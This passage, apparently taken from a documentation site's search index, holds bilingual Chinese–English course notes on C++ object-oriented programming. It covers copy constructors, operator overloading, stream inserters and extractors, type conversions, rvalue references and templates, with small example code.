\u51fd\u6570\u539f\u578b\u58f0\u660e\u662f\u5141\u8bb8\u5728\u51fd\u6570\u5185\u90e8\u53d1\u751f\u7684</li> <li>false</li> <li>false</li> </ol> <ul> <li> <p>Copying </p> <ul> <li>Create a new object from an existing one | \u5728 C \u4e2d\u4e0e\u4f20\u6570\u7ec4\u4e0d\u540c\uff0c\u51fd\u6570\u7684\u53c2\u6570\u5982\u679c\u662f\u7ed3\u6784\u4f53\u4f1a\u5728\u51fd\u6570\u5185\u90e8\u590d\u5236\u6574\u4e2a\u7ed3\u6784\uff0c\u800c\u6570\u7ec4\u662f\u6307\u9488 \u2014 C++ \u4e5f\u662f\u8fd9\u6837</li> </ul> <pre><code>// Currency as pass-by-value argument\nvoid func(Currency c)\n{\n    // ...\n}\n\u00b7\u00b7\u00b7\nCurrency cur(10, 50);\nfunc(cur);  // cur is copied to c\n</code></pre> <ul> <li>\u6b64\u65f6 func \u4e2d\u7684 c \u662f cur \u7684\u62f7\u8d1d\uff0c\u5728\u8c03\u7528 <code>func</code> \u7684\u65f6\u5019\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec07/#the-copy-constructor", "title": "The copy constructor", "text": "<ul> <li>Copying is implemented by the copy constructor</li> <li>Has the unique signature <code>ClassName::ClassName(const ClassName &amp;)</code><ul> <li>Call-by-reference is used for the explicit parameter</li> </ul> </li> <li>C++ builds a copy ctor for you if you don\u2019t provide one<ul> <li>Copies each member variable \u2014 Good for numbers, objects(\u4f1a\u9012\u5f52\u8c03\u7528\u5bf9\u8c61\u4e2d\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570), arrays</li> <li>Copies each pointer \u2013 \u6e90\u5bf9\u8c61\u548c\u62f7\u8d1d\u6784\u9020\u5bf9\u8c61\u6307\u9488\u76f8\u540c\uff0c\u6307\u5411\u540c\u4e00\u7247\u5185\u5b58\u533a\u57df</li> </ul> </li> <li>\u5f53\u4e0d\u9700\u8981\u5168\u76d8\u62f7\u8d1d or \u5bf9\u8c61\u4e2d\u6709\u6307\u9488\uff0c\u9700\u8981\u81ea\u5df1\u5199 Copy Ctor</li> </ul> <p>\u5ef6\u7533</p> codeexplanation <pre><code>// Currency as pass-by-value argument\nCurrency func(Currency c)\n{\n    // ...\n}\n\u00b7\u00b7\u00b7\nCurrency cur(10, 50);\nCurrency cur2 = func(cur);  // cur is copied to c\n</code></pre> <ul> <li><code>Currency cur2 = func(cur);</code> \u5e76\u672a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570</li> <li>\u51fd\u6570\u8fd4\u56de int \u65f6\uff0c\u8fd4\u56de\u503c\u653e\u5728\u5bc4\u5b58\u5668\u4e2d\uff1b\u8fd4\u56de\u7ed3\u6784\u4f53\u65f6\uff0c\u8fd4\u56de\u503c\u653e\u5728\u6808\u4e2d\u3002\u6808\u7684\u7a7a\u95f4\u662f\u5728 caller \u7684\u5185\u5b58\u7a7a\u95f4\u4e2d</li> <li><code>cur2</code> \u7684\u8d4b\u503c\u662f\u5728 callee \u4e2d\u5b8c\u6210\u7684</li> </ul> <ul> <li> <p>When are Copy Ctor called</p> <ul> <li>During call by value</li> </ul> <pre><code>void func(Currency c)\n{\n    // ...\n}\n\u00b7\u00b7\u00b7\nCurrency cur(10, 50);\nfunc(cur);  // cur is copied to c\n</code></pre> <ul> <li>During initialization</li> </ul> <pre><code>Currency cur(10, 50);\nCurrency cur2 = cur;    // cur is copied to cur2\nCurrency cur3(cur);     // cur is copied to cur3\n</code></pre> <ul> <li>During function return</li> </ul> <pre><code>Currency func()\n{\n    Currency cur(10, 50);\n    return cur;     // cur is copied to the return value\n}\n\u00b7\u00b7\u00b7\nCurrency cur2 = func(); // cur is copied to cur2\n</code></pre> </li> <li> <p>Constructions vs. Assignment</p> <ul> <li>Every object is constructed once -&gt; \u8d4b\u503c\u7684\u65f6\u5019\u4e0d\u53d1\u751f\u62f7\u8d1d\u6784\u9020</li> <li>Every object should be destroyed once<ul> <li>Failure to invoke delete()</li> <li>Invoking delete() more than once</li> </ul> </li> <li>Once an object is constructed, it can be the target of many assignment operations</li> <li>\u8d4b\u503c\u3001\u6784\u9020\u5747\u4e3a member-wise, \u5373\u6309\u7167\u6210\u5458\u53d8\u91cf\u7684\u987a\u5e8f\u8fdb\u884c\u8d4b\u503c\u3001\u6784\u9020\uff08bit-wise \u662f\u6309\u7167\u5185\u5b58\u4e2d\u7684\u987a\u5e8f\u8fdb\u884c\u5168\u90e8\u8d4b\u503c\u3001\u6784\u9020\uff09</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec07/#overloaded-operators", "title": "Overloaded Operators | \u91cd\u8f7d\u8fd0\u7b97\u7b26", "text": "<ul> <li>Allows user-defined types to act like built in types</li> <li>Another way to make a fucntion call</li> </ul> Note <p>unary and binary operators can be overloaded</p> <ul> <li><code>+  -  *  /  %  ^  &amp;  |  ~</code></li> <li><code>=  &lt;  &gt;  +=  -=  *=  /=  %=  ^=  &amp;=  |=</code></li> <li><code>&lt;&lt;  &gt;&gt;  &gt;&gt;=  &lt;&lt;=  ==  !=  &lt;=  &gt;=  &amp;&amp;  ||  !  ++  --</code></li> <li><code>,  -&gt;*  -&gt;  ()  []</code></li> <li><code>new  new[]  delete  delete[]</code></li> </ul> <p>operators that cannot be overloaded</p> <ul> <li><code>.  .*  ::  ?:</code></li> <li><code>sizeof  typeid</code></li> <li><code>static_cast  dynamic_cast  const_cast  reinterpret_cast</code></li> </ul> <ul> <li>Restrictions<ul> <li>Only existing operators can be overloaded (you can\u2019t create a ** operator for exponentiation)</li> <li>Operators must be overloaded on a class or enumeration type</li> <li>Overloaded operators must<ul> <li>Preserve number of operands</li> <li>Preserve precedence</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec07/#c-overloaded", "title": "C++ overloaded", "text": "<ul> <li>Just a function with an operator name ( Use the opertaor keyword as a prefix to name operator *(\u00b7\u00b7\u00b7) ) </li> <li>Can be a member function <ul> <li>Implicit first argument <code>const String String::operator +(const String &amp;that);</code></li> <li><code>string a, b; a + b;</code> -&gt; be like <code>a.operator+(b);</code></li> </ul> </li> <li>Can be a global function<ul> <li>Both arguments explicit <code>const String operator +(const String &amp;s1, const String &amp;s2);</code></li> </ul> </li> <li>\u52a0 <code>const</code> \u662f\u4e3a\u4e86\u9632\u6b62 <code>a + b = c</code> \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f</li> </ul>"}, {"location": "Course/OOP/Lec07/#for-member-functions", "title": "For Member functions", "text": "<ul> <li>Implicit first argument</li> <li>Developer must have access to the class definition</li> <li>Members have full access to the all data in the class</li> <li>No type conversion performed on receiver</li> </ul> <pre><code>class Integer\n{\npublic:\n    Integer(int n = 0):i(n) {}\n    const Integer operator +(const Integer &amp;that) const\n    {\n        return Integer(i + that.i);\n    }\nprivate:\n    int i;\n};\nInteger x(1), y(5), z;\nz = x + y;  // x.operator+(y)\nz = x + 3;  // \u6b64\u65f6\u4f1a\u628a 3 \u6784\u9020\u6210\u4e00\u4e2a Integer \u5bf9\u8c61\nz = 3 + y;  // \u6b64\u65f6\u4e0d\u4f1a\u628a 3 \u53d8\u6210 Integer \u5bf9\u8c61\uff0c\u4f46\u4f1a\u5c1d\u8bd5\u628a y \u53d8\u6210 int\n</code></pre> <ul> <li>For binary operators(+, -, *, etc) member functions require one argument</li> <li>For unary operators(++, \u2013, -, !, etc) member functions require no arguments<ul> <li><code>const Interger Interger::operator-() const{ return Integer(-i); }</code></li> <li><code>z = -x</code></li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec07/#for-global-function", "title": "For global function", "text": "<pre><code>const Integer operator+ (const Integer&amp; rhs, const Integer&amp; lhs);\nInteger x, y;\nx + y; // -&gt; operator+ (x, y)\n</code></pre> <ul> <li>Explicit first argument</li> <li>Developer dose not need special access to classes</li> <li>May need to be a friend</li> <li>Type conversions performed on both arguments</li> </ul> <p>conversions</p> codeexplanation <pre><code>z = x + y;\nz = x + 3;\nz = 3 + y;\nz = 3 + 4;\n</code></pre> <ul> <li>\u524d\u4e09\u4e2a\u5de6\u53f3\u4e24\u4e2a\u53d8\u91cf\u90fd\u4f1a\u5c1d\u8bd5\u6784\u9020\u6210 <code>Integer</code></li> <li>\u6700\u540e\u4e00\u4e2a\u5148\u8fdb\u884c <code>3 + 4</code>, \u968f\u540e\u628a\u7ed3\u679c\u5c1d\u8bd5\u6784\u9020\u6210 <code>Integer</code></li> </ul> <ul> <li> <p>Global operators</p> <ul> <li>binary operators requires two arguments</li> <li>unary operators require one</li> <li>If you don\u2019t have access to private data members, then the global function must use the public interface or use <code>friend</code></li> </ul> <pre><code>class Integer\n{\n    friend const Integer operator+ (const Integer&amp; rhs, const Integer&amp; lhs);\n    \u00b7\u00b7\u00b7\n};\nconst Integer operator+ (const Integer&amp; rhs, const Integer&amp; lhs)\n{\n    return Integer(lhs.i + rhs.i);\n}\n</code></pre> </li> </ul> Members vs. Free Function <ul> <li>Unary operators should be members</li> <li><code>= () [] -&gt; -&gt;*</code> must be members</li> <li>assignment operators should be members</li> <li>All other binary operators as non-members</li> </ul>"}, {"location": "Course/OOP/Lec07/#argument-passing-return-values", "title": "Argument Passing &amp; Return Values", "text": "<ul> <li>Argument Passing<ul> <li>If it is read-only, pass it in as a const reference (except for built-in types)</li> <li>make member functions const that do not modify the class (boolean operators, +, -, etc)</li> <li>for global functions, if the left-hand side changes, pass as a reference (assignment operators)</li> </ul> </li> <li>Return Values<ul> <li>Select the return type depending on the expected meaning of the operator. For example, <ul> <li>For operator+, you need to generate a new object. Return as a const object so the result cannot be modified as an left-value.</li> <li>Logical operators should return bool(or int for older compilers)</li> </ul> </li> </ul> </li> </ul> Tip <ul> <li>Pass in an object it you want to store it</li> <li>Pass in a reference or pointer if you want to do something to it</li> <li>Pass in a const reference or pointer if you want to get the values</li> <li>Pass out an object if you create it in the function</li> <li>Pass out a reference or pointer of the passed in only</li> <li>Never new something and return its pointer</li> </ul>"}, {"location": "Course/OOP/Lec07/#the-prototypes-of-operators", "title": "The prototypes of operators", "text": "<ul> <li><code>+ - * / % ^ &amp; | ~</code><ul> <li><code>const Integer operator+ (const Integer&amp; rhs, const Integer&amp; lhs);</code></li> </ul> </li> <li><code>! &amp;&amp; || &lt; &gt; &lt;= &gt;= == !=</code><ul> <li><code>bool operator&lt; (const Integer&amp; rhs, const Integer&amp; lhs) const;</code></li> </ul> </li> <li><code>[]</code><ul> <li>Must be a member function</li> <li>Single argument</li> <li>Implies that the object it is being called for acts like an array, so it should return a reference<ul> <li><code>Integer v[10]; v[0] = 1;</code></li> <li>if you return pointer -&gt; you should use <code>*v[0] = 1;</code></li> </ul> </li> </ul> </li> <li> <p><code>++ --</code></p> <ul> <li>How to distinguish between prefix and postfix?<ul> <li>Prefix: <code>const Integer&amp; Integer::operator++();</code></li> <li>Postfix: <code>const Integer Integer::operator++(int);</code></li> </ul> </li> <li>postfix forms take an int argument \u2013 compiler will pass in 0 as that int</li> <li>User-defined prefix is more efficient than postfix</li> </ul> <pre><code>class Integer\n{\npublic:\n    const Integer&amp; operator++()    // prefix\n    {\n        *this += 1;     // increment\n        return *this;   // fetch\n    }\n    // int argument not used so leave it unnamed\n    // won't get compiler warning\n    const Integer operator++(int) // postfix\n    {\n        Integer old = *this;    // fetch\n        ++(*this);              // increment\n        return old;             // return old value\n    }\n    \u00b7\u00b7\u00b7\n    Integer x(1);\n    ++x;    // calls x.operator++()\n    x++;    // calls x.operator++(0)\n};\n</code></pre> </li> </ul>"}, {"location": "Course/OOP/Lec07/#stream", "title": "Stream", "text": "<ul> <li> <p>Defining a stream extractor</p> <ul> <li>Has to be a 2-argument global(free) function</li> <li>First argument is an <code>istream&amp;</code></li> <li>Second argument is a reference to a value</li> </ul> <pre><code>istream&amp; operator&gt;&gt; (istream&amp; in, T&amp; obj)\n{\n    // specfic code to read obj \n    \u00b7\u00b7\u00b7\n    return in;\n}\n</code></pre> <ul> <li>Return an <code>istream&amp;</code> for chaining</li> </ul> <pre><code>cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n((cin &gt;&gt; a) &gt;&gt; b) &gt;&gt; c;\n</code></pre> </li> <li> <p>Creating a stream inserter</p> <ul> <li>First argument is an <code>ostream&amp;</code></li> <li>Second argument is any value</li> </ul> <pre><code>ostream&amp; operator&lt;&lt; (ostream&amp; out, const T&amp; obj)\n{\n    // specfic code to write obj \n    \u00b7\u00b7\u00b7\n    return out;\n}\n</code></pre> <ul> <li>Return an <code>ostream&amp;</code> for chaining</li> </ul> <pre><code>cout &lt;&lt; a &lt;&lt; b &lt;&lt; c;\n((cout &lt;&lt; a) &lt;&lt; b) &lt;&lt; c;\n</code></pre> </li> <li> <p>Creating manipulators</p> <ul> <li>You can define your own manipulators</li> </ul> <pre><code>// skeleton for an output stream manipulator\nostream&amp; manipulator(ostream&amp; out)\n{\n    // specific code to manipulate out\n    \u00b7\u00b7\u00b7\n    return out;\n}\nostream&amp; tab(ostream&amp; out)\n{\n    return out &lt;&lt; '\\t';\n}\ncout &lt;&lt; \"Hello\" &lt;&lt; tab &lt;&lt; \"World\" &lt;&lt; endl;\n</code></pre> </li> <li> <p>Copying vs. Initialization</p> </li> </ul> codeOutputMore <pre><code>#include &lt;iostream&gt;\nusing namespace std;\nclass Fi\n{\npublic:\n    Fi() { cout &lt;&lt; \"Fi()\" &lt;&lt; endl; }\n};\nclass Fee\n{\n    int i;\npublic:\n    Fee(int) { cout &lt;&lt; \"Fee(int)\" &lt;&lt; endl; }\n    Fee(const Fi&amp;) { cout &lt;&lt; \"Fee(Fi)\" &lt;&lt; endl; }\n    Fee&amp; operator=(const Fee&amp; that)\n    {\n        i = that.i;\n        cout &lt;&lt; \"=()\\n\";\n        return *this;\n    }\n};\nint main()\n{\n    Fee fee = 1;    // Fee(int)\n    Fi fi;\n    Fee fum = fi;   // Fee(Fi)\n    fum = fi;\n}\n</code></pre> <pre><code>Fee(int)\nFi()\nFee(Fi)\nFee(Fi)\n=()\n</code></pre> <ul> <li>\u8fd9\u79cd <code>=</code> \u5e76\u4e0d\u5b89\u5168\uff0c\u56e0\u4e3a\u5f88\u53ef\u80fd\u53d1\u751f <code>fum = fum;</code> \u7684\u73b0\u8c61</li> <li>\u53ef\u6539\u5199\u4e3a</li> </ul> <pre><code>T&amp; T::operator=(const T&amp; that)\n{\n    // check for self assignment\n    if(this != &amp;that)\n    {\n        // perform assignment\n        \u00b7\u00b7\u00b7\n    }\n    return *this;\n}\n</code></pre> <ul> <li>Assignment Operator<ul> <li>For classes with dynamically allocated memory declare an assignment operator(and a copy constructor)</li> <li>To prevent assignment, explicitly declare <code>operator=</code> as <code>private</code></li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec07/#value-classes", "title": "Value classes", "text": "<p>Note</p> <ul> <li>Appear to be primitive data types</li> <li>Passed to and returned from functions</li> <li>Have overloaded operators(often)</li> <li>Can be converted to and from others types</li> <li>like: Complex, Date, String</li> </ul> <ul> <li> <p>User-defined Type conversions</p> <ul> <li>A conversion operator can be used to convert an object of one class into an object of another class or a built-in type</li> <li> <p>Compilers perform implicit conversions using:</p> <ul> <li>Single-argument constructors</li> </ul> <pre><code>class PathName\n{\n    string name;\npublic:\n    //or could be multi-argument with defaults\n    PathName(const string&amp;);\n    ~PathName();\n};\n\u00b7\u00b7\u00b7\nstring abc(\"abc\");\nPathName xyz(abc);  //OK\n</code></pre> <ul> <li> <p>implicit type conversion operators (Preventing implicit conversions)</p> codeexplanation <pre><code>class PathName\n{\n    string name;\npublic:\n    explicit PathName(const string&amp;);\n    ~ PathName();\n};\n\u00b7\u00b7\u00b7\nstring abc(\"abc\");\nPathName xyz(abc);  // OK\nxyz = abc;  // error!\n</code></pre> <ul> <li>New keyword: <code>explicit</code></li> <li>\u7528\u5728\u4e0a\u8ff0\u7c7b\u4f3c\u7684\u51fd\u6570\u524d\uff0c\u8868\u793a\u6b64\u7c7b\u6784\u9020\u51fd\u6570\u51fd\u6570\u53ea\u7528\u4e8e\u6784\u9020\u4e0d\u7528\u4e8e\u7c7b\u578b\u8f6c\u6362</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u66f4\u901a\u7528/\u76f4\u63a5\u7684\u7c7b\u578b\u8f6c\u6362\u65b9\u6cd5 \u2014 Operator conversion</p> <ul> <li>Function will be called automatically</li> <li>Return type is same as function name</li> </ul> <pre><code>class Rational\n{\npublic:\n    \u00b7\u00b7\u00b7\n    operator double() const;    // Rational to double (double() \u53ef\u4ee5\u662f\u5176\u4ed6\u4efb\u4f55\u7c7b\u578b\u7684\u540d\u5b57)\n}\n\u00b7\u00b7\u00b7\nRational::operator double() const\n{\n    return numerator_/(double)denominator_;\n}\nRational r(1, 3);\ndouble d = 1.3 * r; // r =&gt; double\n</code></pre> <p>General form of conversion ops</p> <ul> <li>X::operator T()<ul> <li>Operator name is any type descriptor</li> <li>No explicit arguments</li> <li>No return type</li> <li>Complier will use it as a type conversion from <code>X</code> to <code>T</code></li> </ul> </li> </ul> </li> <li> <p>C++ type conversions</p> <ul> <li>Built-in conversions<ul> <li>Primitive <ul> <li><code>char -&gt; short -&gt; int -&gt; float -&gt; double (int -&gt; long)</code></li> </ul> </li> <li>Implicit (for any type T)<ul> <li><code>T -&gt; T&amp;; T&amp; -&gt; T;  T* -&gt; void*</code></li> <li><code>T[] -&gt; T*; T* -&gt; T[]; T -&gt; const T</code></li> </ul> </li> </ul> </li> <li> <p>User-defined <code>T -&gt; C</code></p> <ul> <li>if <code>C(T)</code> is a valid constructor call for <code>C</code></li> <li>if <code>operator C()</code> is defined for <code>T</code></li> </ul> </li> <li> <p>But it\u2019s better to avoid User-defined conversions. Use explicit conversion functions instead. For example:</p> </li> <li>In <code>class Rational</code> instead of the conversion operator, declare a member function <code>double to_double() const;</code></li> </ul> </li> <li> <p>Overloading and type conversion</p> <ul> <li>C++ checks each argument for a \u201cbest match\u201d</li> <li>Best match means cheapest<ol> <li>Exact match is cost-free</li> <li>Matches involving built-in conversions</li> <li>User-defined type conversions</li> </ol> </li> </ul> </li> </ul> \u5ef6\u7533 - LValue vs. RValue <ul> <li>\u53ef\u4ee5\u7b80\u5355\u8ba4\u4e3a\u80fd\u51fa\u73b0\u5728\u8d4b\u503c\u53f7\u5de6\u8fb9\u7684\u90fd\u662f\u5de6\u503c\uff1a\u53d8\u91cf\u672c\u8eab\u3001\u5f15\u7528\uff1b<code>*, []</code>\u8fd0\u7b97\u7684\u7ed3\u679c</li> <li>\u53ea\u80fd\u51fa\u73b0\u5728\u8d4b\u503c\u53f7\u53f3\u8fb9\u7684\u90fd\u662f\u53f3\u503c\uff1a\u5b57\u9762\u91cf\uff1b\u8868\u8fbe\u5f0f</li> <li>\u5f15\u7528\u53ea\u80fd\u63a5\u53d7\u5de6\u503c -&gt; \u5f15\u7528\u662f\u5de6\u503c\u7684\u522b\u540d</li> <li>\u8c03\u7528\u51fd\u6570\u65f6\u7684\u4f20\u53c2\u76f8\u5f53\u4e8e\u53c2\u6570\u53d8\u91cf\u5728\u8c03\u7528\u65f6\u7684\u521d\u59cb\u5316</li> </ul> <p>\u53f3\u503c\u5f15\u7528</p> <ul> <li><code>int x = 20;</code> \u5de6\u503c</li> <li><code>int&amp;&amp; rx = x * 2;</code> x*2 \u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u53f3\u503c\uff0crx \u5ef6\u957f\u5176\u751f\u547d\u5468\u671f\uff1brx \u662f\u53f3\u503c\u5f15\u7528\uff08\u5bf9\u53f3\u503c\u7684\u5f15\u7528\uff09-&gt; \u76f8\u5f53\u4e8e\u628a\u53f3\u503c\u5148\u56fa\u5b9a\u4e0b\u6765</li> <li><code>int y = rx + 2;</code> \u56e0\u6b64\u4f60\u53ef\u4ee5\u91cd\u7528\u5b83\uff1a42</li> <li><code>rx = 100;</code> \u4e00\u65e6\u4f60\u521d\u59cb\u5316\u4e00\u4e2a\u53f3\u503c\u5f15\u7528\u53d8\u91cf\uff0c\u8be5\u53d8\u91cf\u5c31\u6210\u4e3a\u4e86\u4e00\u4e2a\u5de6\u503c\uff0c\u53ef\u4ee5\u88ab\u8d4b\u503c</li> <li><code>int&amp;&amp; rrx1 = x;</code> ERROR\uff1a\u53f3\u503c\u5f15\u7528\u65e0\u6cd5\u88ab\u5de6\u503c\u521d\u59cb\u5316</li> <li><code>const int&amp;&amp; rrx2 = x</code> ERROR: \u53f3\u503c\u5f15\u7528\u65e0\u6cd5\u88ab\u5de6\u503c\u521d\u59cb\u5316</li> </ul> <p>\u53f3\u503c\u5f15\u7528\u7684\u7528\u9014</p> <pre><code>// \u63a5\u6536\u5de6\u503c \nvoid func(int&amp; lref)\n{\n    cout &lt;&lt; \"lvalue ref\" &lt;&lt; endl;\n}\n// \u63a5\u6536\u53f3\u503c -- \u4e3a\u4e86\u8282\u7701\u5185\u5b58\uff0c\u53f3\u503c\u5f15\u7528\u53ef\u4ee5\u63a5\u6536\u53f3\u503c\uff0c\u800c\u4e0d\u662f\u62f7\u8d1d\u4e00\u4efd\nvoid func(int&amp;&amp; rref)\n{\n    cout &lt;&lt; \"rvalue ref\" &lt;&lt; endl;\n}\nint main()\n{\n    int x = 10;\n    func(x);    // lvalue ref\n    func(10);   // rvalue ref\n    return 0;\n}\n</code></pre> <ul> <li>\u5982\u679c\u662f\u5de6\u503c\u5f15\u7528\uff0c\u4e5f\u8981\u5148\u653e\u5230\u4e00\u4e2a\u53d8\u91cf\u4e2d\u624d\u80fd\u4f20\u9012</li> <li>\u800c\u53f3\u503c\u5f15\u7528\u4e0d\u9700\u8981\u6709\uff0c\u53ef\u4ee5\u52a0\u901f\u8fd0\u7b97\uff0c\u51cf\u5c11\u5185\u5b58\u62f7\u8d1d</li> </ul>"}, {"location": "Course/OOP/Lec08/", "title": "Templates | \u6a21\u677f", "text": "<p> \u7ea6 624 \u4e2a\u5b57  80 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> Why templates <ul> <li>Suppose you need a list of X and a list of Y<ul> <li>The lists would use similar code</li> <li>They differ by the type stored in the list</li> </ul> </li> <li>Choices<ul> <li>Require common base class<ul> <li>May not be desirable</li> </ul> </li> <li>CLone code<ul> <li>preserves type-safety</li> <li>hard to manage</li> </ul> </li> <li>Untyped lists<ul> <li>type unsafe</li> </ul> </li> </ul> </li> </ul> <ul> <li>Final choice: templates<ul> <li>Reuse source code<ul> <li>generic programming | \u6cdb\u578b\u7f16\u7a0b</li> <li>use types as parameters in class or function definitions</li> </ul> </li> <li>Function Template | \u51fd\u6570\u6a21\u677f\uff08\u5236\u9020\u51fd\u6570\uff09<ul> <li>Example: sort function</li> </ul> </li> <li>Class Template | \u7c7b\u6a21\u677f(\u5236\u9020\u7c7b)<ul> <li>Example: container such as stack, list, queue\u2026<ul> <li>Stack operations are independent of the type of items in the stack</li> </ul> </li> <li>template member functions</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec08/#function-templates", "title": "Function Templates", "text": "<ul> <li>Perform similar operations on different types of data</li> <li>Swap function for two int arguments:</li> </ul> <pre><code>void swap(int&amp; a, int&amp; b) \n{\n    int temp = a;\n    a = b;\n    b = temp;\n}\n</code></pre> <ul> <li>What if we want to swap floats, strings, Currency \u2026? (We need to rewrite the function for each type)</li> <li>But we can use a template!!!</li> </ul> swap function template <pre><code>template &lt;class T&gt;  // \u8bf4\u660e\u4e0b\u9762\u7684\u4e1c\u897f\u662f\u4e2a\u6a21\u677f\nvoid swap(T&amp; a, T&amp; b) \n{\n    T temp = a;\n    a = b;\n    b = temp;\n}\n</code></pre> <ul> <li>The template keyword introduces the template</li> <li>The class T specifies a parameterized type name<ul> <li>class means any built-in type or user-defined type</li> </ul> </li> <li>Inside the template, use T as a type name</li> </ul> <ul> <li> <p>Template Instantiation \u2013 Generating a declaration from a template class/function and template arguments:</p> <ul> <li>Types are substituted into template</li> <li>New body of function or class definition is created <ul> <li>syntax errors, type checking</li> </ul> </li> <li>Specialization - a version of template for a particular argument(s)</li> </ul> </li> <li> <p>Interactions</p> <ul> <li>Only exact match on types is used</li> <li>No conversion operations are applied</li> </ul> <pre><code>swap(int, int); // OK\nswap(double, double); // OK\nswap(int, double); // Error\n</code></pre> <ul> <li>Implicit conversions are ignored</li> <li>Template functions and regular functions coexist</li> </ul> </li> <li> <p>Overloading rules</p> <ul> <li>Check first for unique function match</li> <li>Then check for unique function template</li> <li>Then do overloading on functions</li> </ul> <pre><code>void f(float i, float k);\ntemplate &lt;class T&gt; \nvoid f(T i, T k);\nf(1.0, 2.0);    // \u6a21\u677f\nf(1, 2);        // \u6a21\u677f\nf(1.2, 0);      // \u4e24\u4e2a\u7c7b\u578b\u4e0d\u540c\uff0c\u8f6c\u6210 float \u8c03\u7528 f(float, float)\n</code></pre> </li> <li> <p>Function Instantiation</p> <ul> <li>The compiler deduces the template type from the actual arguments passed into the function</li> <li>Can be explicit: For example, if the parameter is not in the function signature (older compilers won\u2019t allow this)</li> </ul> <pre><code>template &lt;class T&gt;\nvoid f(void) { ... }\nf&lt;int&gt;(); // type T is int    \n</code></pre> <ul> <li>\u5728\u51fd\u6570\u540e\u9762\u52a0\u5c16\u62ec\u53f7\uff0c\u5c16\u62ec\u53f7\u4e2d\u7684\u7c7b\u578b\u8868\u793a <code>T</code> \u7684\u7c7b\u578b</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec08/#class-templates", "title": "Class Templates", "text": "<ul> <li>Classes parameterized by type<ul> <li>Abstract operations from the types being operated upon</li> <li>Define potentially infinite set of classes</li> <li>Another step towards reuse</li> </ul> </li> <li>Typical use: container classes<ul> <li><code>stack&lt;int&gt;</code> \u2014 a stack that is parameterized over int</li> <li><code>list&lt;Currency&amp;&gt;</code></li> </ul> </li> </ul> <p>Important</p> <ul> <li>\u5982\u679c\u5c06\u7c7b\u6a21\u677f\u4e2d\u51fd\u6570\u7684\u58f0\u660e\u548c\u5b9a\u4e49\u5206\u5f00\u5199\uff0c\u5219\u9664\u7c7b\u524d\u8981\u52a0 <code>template</code>, \u6bcf\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\u4e5f\u8981\u52a0 <code>template</code></li> <li>\u6240\u6709\u7684\u51fd\u6570\u90fd\u662f <code>ClassName&lt;T&gt;::funcName()</code> \u7684\u5f62\u5f0f</li> </ul> Example <pre><code>template &lt;class T&gt;\nclass Vector {\npublic:\n    Vector(int);\n    ~Vector();\n    Vector(const Vector&amp;);\n    Vector&amp; operator=(const Vector&amp;);\n    T&amp; operator[](int);\nprivate:\n    int size;\n    T* data;\n};\ntemplate &lt;class T&gt;\nVector&lt;T&gt;::Vector(int s) : size(s)\n{\n    data = new T[s];\n}\ntemplate &lt;class T&gt;\nT&amp; Vector&lt;T&gt;::operator[](int i) \n{\n    if (i &lt; 0 || i &gt;= size) {\n        throw \"Index out of range\";\n    }\n    else\n    {\n        return data[i];\n    }\n}\n</code></pre> <ul> <li> <p>Templates can use multiple types</p> <pre><code>template &lt;class Key, class Value&gt;\nclass HashTable \n{\n    const Value&amp; lookup(const Key&amp;) const;\n    void install(const Key&amp;, const Value&amp;);\n    ...\n};\n</code></pre> </li> <li> <p>Templates nest \u2014 they\u2019re just new types</p> <ul> <li><code>Vector&lt;Vector&lt;double *&gt; &gt;</code></li> </ul> </li> <li> <p>Type arguments can be complicated</p> <ul> <li><code>Vector&lt; int (*)(Vector&lt;double&gt;&amp;, int) &gt;</code> \u2014 \u4e00\u4e2a <code>Vector</code> \u91cc\u9762\u662f\u51fd\u6570\u6307\u9488\uff0c\u6307\u9488\u6307\u5411\u7684\u51fd\u6570\u7684\u53c2\u6570\u662f <code>Vector&lt;double&gt;&amp;</code> \u548c <code>int</code>\uff0c\u8fd4\u56de\u503c\u662f <code>int</code></li> </ul> </li> <li> <p>Expression parameters</p> <ul> <li>Template arguments can be constant expressions</li> <li>Non-Type parameters<ul> <li>can have a default argument</li> </ul> </li> </ul> <pre><code>template &lt;class T, int size = 100&gt;\nclass Vector \n{\n    ...\nprivate:\n    T data[size];   // fixed size array\n};\n</code></pre> Usage:Non-type parameters <ul> <li>Usage<ul> <li><code>Vector&lt;int, 100&gt; v;</code></li> <li><code>Vector&lt;int, 50 * 2&gt; v;</code></li> <li><code>Vector&lt;int&gt; v;</code> \u2014 uses default <code>size = 100</code></li> </ul> </li> <li>Summary<ul> <li>Embedding sizes not necessarily a good idea</li> <li>Can make code faster</li> <li>Makes use more complicated \u2014 size argument appears everywhere</li> <li>Can lead to code bloat</li> </ul> </li> </ul> </li> </ul> <p>Template programming</p> <ul> <li>\u4e00\u4e2a\u7c7b\u6a21\u677f\u7684\u5168\u90e8\u90fd\u5e94\u8be5\u5728\u4e00\u4e2a\u5934\u6587\u4ef6\u4e2d\uff0c\u800c\u4e0d\u662f\u58f0\u660e\u548c\u5b9a\u4e49\u5206\u5f00\u653e\u5728\u4e24\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5426\u5219\u7f16\u8bd1\u5668\u4f1a\u94fe\u63a5\u5931\u8d25</li> <li>\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u7c7b\u6a21\u677f\u7684\u51fd\u6570\u90fd\u505a\u6210 <code>inline</code></li> </ul> Templates and Inheritance <ul> <li>Templates can inherit from non-template classes</li> </ul> <pre><code>class Derived : public Base\n{\n    ...\n};\n</code></pre> <ul> <li>Templates can inherit from template classes | \u5f53\u5b9e\u4f8b\u5316 Derived \u65f6\uff0c\u8fd8\u9700\u8981\u540c\u6b65\u5b9e\u4f8b\u5316 Base</li> 